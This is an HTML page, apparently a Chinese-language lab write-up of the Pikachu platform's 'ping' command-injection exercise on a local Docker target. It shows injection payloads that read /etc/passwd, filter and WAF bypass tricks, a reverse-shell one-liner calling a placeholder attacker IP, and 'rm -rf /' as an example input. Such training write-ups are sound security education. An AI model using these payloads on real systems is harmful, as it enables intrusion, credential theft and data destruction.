@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: RCE exec "ping" - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e17;
+            font-family: 'Inter', sans-serif;
+            color: #ccd6f6;
+            padding: 6rem 1rem 4rem 1rem;
+            display: flex;
+            justify-content: center;
+            line-height: 1.8;
+        }
+        .post-container {
+            max-width: 820px;
+            width: 100%;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 32px;
+            padding: 3rem;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+        }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap; }
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { color: #e2e8f0; font-family: 'Courier New', monospace; font-size: 0.95rem; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+    </style>
+</head>
+<body>
+    <div class="post-container">
+        <h1><i class="fas fa-terminal"></i> RCE exec "ping" - Pikachu Writeup</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月19日</span>
+            <span><i class="fas fa-tag"></i> Pikachu</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> RCE</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>RCE exec "ping"</li>
+            <li><strong>题目平台：</strong>Pikachu 漏洞练习平台</li>
+            <li><strong>题目类型：</strong>Web安全 / 远程命令执行（RCE） / 命令注入</li>
+            <li><strong>靶场链接：</strong>http://localhost:8080/vul/rce/rce_ping.php（本地 Docker 环境）</li>
+            <li><strong>涉及工具：</strong>浏览器（Chrome/Firefox）、终端（Terminal）</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>系统命令注入（Command Injection）</strong>。后端提供了一个 Ping 功能，用于探测目标 IP 的连通性。如果后端代码直接使用字符串拼接的方式，将用户输入的 IP 参数拼接到系统命令中（例如 <code>ping -c 4 $ip</code>），攻击者就可以利用 Linux 命令连接符（如 <code>;</code>、<code>|</code>、<code>&</code>），在合法命令后追加执行任意恶意系统命令，从而接管服务器。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <p>页面提示“Here, please enter the target IP address!”。解题思路如下：</p>
+        <ul>
+            <li>首先输入 <code>127.0.0.1</code>，确认 Ping 功能正常，页面会回显 Ping 结果。</li>
+            <li>尝试使用分号 <code>;</code> 作为命令分隔符。输入 <code>127.0.0.1; whoami</code>，观察页面是否在 Ping 结果后额外显示系统用户名。</li>
+            <li>若成功，进一步利用 <code>cat</code> 命令读取服务器敏感文件（如 <code>/etc/passwd</code>），证明漏洞存在。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：命令分隔符被过滤</h4>
+            <p><strong>踩坑情况：</strong>使用 <code>127.0.0.1; cat /etc/passwd</code> 时，如果后端代码使用了黑名单过滤掉 <code>;</code>，则注入会失败。</p>
+            <p><strong>原因分析：</strong>后端可能只拦截了部分命令分隔符，或者对特殊字符做了转义。</p>
+            <p><strong>改进方式：</strong>尝试其他 Linux 命令连接符，如管道符 <code>|</code>、逻辑与 <code>&&</code>、逻辑或 <code>||</code> 或反引号 <code>`命令`</code>。例如：<code>127.0.0.1 | whoami</code> 或 <code>127.0.0.1 && whoami</code>。</p>
+        </div>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录二：输入内容被 URL 编码</h4>
+            <p><strong>踩坑情况：</strong>在输入框直接输入包含空格和特殊符号的 Payload，点击提交后，可能因为前端表单自动编码导致后端解析出错。</p>
+            <p><strong>原因分析：</strong>浏览器会对表单内容进行 URL 编码（如空格变为 <code>%20</code>），如果后端未做正确的解码，命令可能无法执行。</p>
+            <p><strong>改进方式：</strong>使用 Burp Suite 抓包或浏览器 F12 Network 面板，查看实际发送的 Payload，必要时手动修改数据包，或使用 <code>%09</code>（Tab 键）等替代空格绕过。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 终极解法：利用分号执行任意命令</h4>
+            <p>在输入框中提交以下 Payload：</p>
+            <pre><code>127.0.0.1; cat /etc/passwd</code></pre>
+            
+            <p><strong>代码逐个符号深度解析：</strong></p>
+            <ul>
+                <li><code>127.0.0.1</code>：合法的 IP 地址，用于完成正常的 Ping 命令。</li>
+                <li><code>;</code>：Linux 命令分隔符。它告诉系统，执行完前一条命令后，立即执行后一条命令。</li>
+                <li><code>cat</code>：Linux 系统中的常用命令，用于读取并输出文件内容。</li>
+                <li><code>/etc/passwd</code>：Linux 系统中存储用户账户信息的核心敏感文件。</li>
+            </ul>
+            <p>提交后，后端执行的系统命令变为 <code>ping -c 4 127.0.0.1; cat /etc/passwd</code>。页面成功回显了系统的用户列表，证明命令注入攻击成功。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>反弹 Shell（Reverse Shell）：</strong>在实战中，攻击者通常不会只看一眼 <code>/etc/passwd</code>，而是利用命令注入写入反弹 Shell 命令（如 <code>bash -i >& /dev/tcp/攻击者IP/端口 0>&1</code>），从而获得一个交互式的服务器控制终端。</li>
+            <li><strong>代码审计：</strong>在审计 PHP 或 Java 代码时，应重点关注 <code>exec()</code>、<code>system()</code>、<code>shell_exec()</code>、<code>passthru()</code> 等危险函数。如果其参数直接使用了用户输入且未做过滤，即可判定为 RCE 漏洞。</li>
+            <li><strong>WAF 绕过：</strong>在真实攻防中，WAF 通常会拦截 <code>;</code>、<code>|</code> 和 <code>cat</code> 等关键字。攻击者会尝试使用编码绕过（如 <code>c\at</code>、<code>c"at"</code>）、变量拼接（如 <code>a=c;b=at;$a$b</code>）等方式进行绕过。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. RCE（Remote Command Execution）</h4>
+            <p>远程命令执行漏洞。指攻击者通过 Web 应用接口，将恶意系统命令注入到服务器后端执行，从而获得服务器操作权限。RCE 是 Web 安全中危害等级最高的漏洞之一，相当于服务器被直接控制。</p>
+
+            <h4>2. Linux 命令连接符</h4>
+            <p>在 Linux Shell 中，常用的命令连接符有：</p>
+            <ul>
+                <li><code>;</code>：顺序执行，无论前一条命令成功与否，后一条都会执行。</li>
+                <li><code>|</code>：管道符，将前一条命令的输出作为后一条命令的输入。</li>
+                <li><code>&&</code>：逻辑与，前一条命令执行成功（返回 0）时，后一条才会执行。</li>
+                <li><code>||</code>：逻辑或，前一条命令执行失败时，后一条才会执行。</li>
+            </ul>
+
+            <h4>3. 为什么会有命令注入漏洞？</h4>
+            <p>Web 应用为了实现某些系统级功能（如 Ping 测试、文件处理、系统监控），会调用操作系统底层的命令。如果开发者使用了字符串拼接来构造命令，没有对用户输入进行严格的过滤或转义，攻击者就能通过构造特殊字符，欺骗操作系统执行额外的恶意命令。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 SQL 注入相比：</strong>SQL 注入攻击的是后端的数据库，窃取或篡改数据；RCE 攻击的是操作系统，直接获取服务器最高权限，两者的危害级别和攻击目标完全不同。</li>
+            <li><strong>与文件上传漏洞相比：</strong>文件上传需要绕过前端和后端的文件类型检测，最终目的是上传 WebShell；RCE 命令注入不需要上传文件，直接在请求中执行命令，利用更加直接。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因（为什么存在）</h3>
+        <p>这类漏洞的出现，是因为开发者在编写调用系统命令的代码时，过度信任了用户的输入。例如，直接编写 <code>exec("ping -c 4 " . $_POST['ip'])</code>。开发人员未考虑到用户可能输入 <code>127.0.0.1; rm -rf /</code> 这样的恶意指令，导致系统命令被非法拼接执行。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在实际的渗透测试中，RCE 是攻击者的终极目标之一。一旦发现 RCE 漏洞，攻击者会立即尝试写入木马、创建管理员用户、连接内网其他机器，或者植入挖矿程序。在企业安全建设中，RCE 漏洞通常被列为最高危、最优先修复的漏洞类型。</p>
+
+        <h3>4. 如何抽象理解概念（大白话理解）</h3>
+        <p>如果把服务器比作一个餐厅厨房：</p>
+        <ul>
+            <li><strong>正常功能：</strong>你点了一份“蛋炒饭”（输入 127.0.0.1），厨师正常做了一份给你。</li>
+            <li><strong>命令注入：</strong>你在点单时，加了一句：“来一份蛋炒饭，<strong>顺便把厨房所有的食材都扔了</strong>（<code>; rm -rf /</code>）”。如果厨师是个只会照本宣科的机器人，它就会既做蛋炒饭，又把厨房毁了。</li>
+            <li><strong>结论：</strong>命令注入的本质是，利用系统命令分隔符，让服务器在完成正常功能的同时，执行额外的恶意操作。这是极其危险的安全漏洞。</li>
+        </ul>
+
+        <p style="margin-top: 2rem; text-align: center;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/pikachu.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 Pikachu 列表</a>
+            <a href="/" class="action-link secondary" style="color: #8892b0; border-color: #475569;"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
